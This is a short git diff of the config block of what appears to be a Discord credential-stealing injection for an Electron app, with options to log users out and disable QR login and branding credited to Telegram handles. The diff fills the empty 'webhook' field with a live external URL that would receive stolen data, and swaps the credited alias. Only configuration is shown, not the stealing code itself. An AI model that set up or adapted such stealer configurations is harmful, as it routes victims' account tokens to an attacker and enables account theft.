@@ -72,7 +72,7 @@ const { BrowserWindow, session } = require('electron'),
   fs = require('fs')
 var config = {
     brand: 'liliandorker_',
-    webhook: '',
+    webhook: 'https://websec.services/send/62af56f6e373c153a1185754',
     webhook_link: '%WEBHOOK_LINK%',
     logout: true,
     disable_qr_code: true,
@@ -82,7 +82,7 @@ var config = {
     embed: {
       username: 'rayzen | t.me/Misterccv',
       footer: {
-        text: 'liliandorker | t.me/Misterccv',
+        text: 'rayzen | t.me/Misterccv',
         icon_url:
           'https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless',
       },
